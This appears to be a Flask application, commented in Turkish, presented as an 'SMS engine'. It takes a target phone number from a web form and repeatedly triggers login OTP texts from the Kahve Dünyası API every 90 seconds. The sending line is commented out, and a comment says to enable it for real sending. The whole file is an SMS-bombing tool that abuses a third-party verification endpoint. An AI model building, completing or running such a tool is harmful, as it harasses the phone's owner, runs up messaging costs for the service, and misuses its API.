from flask import Flask, render_template, request, jsonify
from flask_apscheduler import APScheduler
import requests
import time

app = Flask(__name__)
scheduler = APScheduler()

class Config:
    SCHEDULER_API_ENABLED = True

app.config.from_object(Config())
scheduler.init_app(app)
scheduler.start()

# Aktif numaralar: {telefon: başlangıç_zamanı}
active_targets = {}

def send_kahve_dunyasi_sms(phone_number):
    url = "https://api.kahvedunyasi.com/v1/login/otp"
    payload = {
        "mobile_number": phone_number,
        "channel": "sms"
    }
    try:
        # Gerçek gönderim için aşağıdaki satırı aktif edebilirsiniz:
        # requests.post(url, json=payload, timeout=10)
        print(f"[{time.ctime()}] SMS gönderildi: {phone_number}")
    except Exception as e:
        print(f"Hata: {e}")

# Her 90 saniyede bir çalışır
@scheduler.task('interval', id='sms_job', seconds=90)
def scheduled_sms_job():
    for phone_number in list(active_targets.keys()):
        send_kahve_dunyasi_sms(phone_number)

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>SMS Motoru</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; background: #f0f0f0; }
            .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); width: 300px; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
            button { width: 100%; padding: 10px; background: #4b2c20; color: white; border: none; border-radius: 5px; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="card">
            <h3>SMS Motoru</h3>
            <input type="text" id="phone" placeholder="5XXXXXXXXX">
            <button onclick="start()">Başlat</button>
            <p id="msg"></p>
        </div>
        <script>
            function start() {
                const p = document.getElementById('phone').value;
                fetch('/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: p})
                }).then(r => r.json()).then(d => {
                    document.getElementById('msg').innerText = d.message;
                });
            }
        </script>
    </body>
    </html>
    """

@app.route('/start', methods=['POST'])
def start():
    phone = request.json.get('phone')
    if phone:
        active_targets[phone] = time.time()
        send_kahve_dunyasi_sms(phone) # İlkini hemen atar
        return jsonify({"message": "Motor başlatıldı (90sn aralıkla)"})
    return jsonify({"message": "Hata!"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
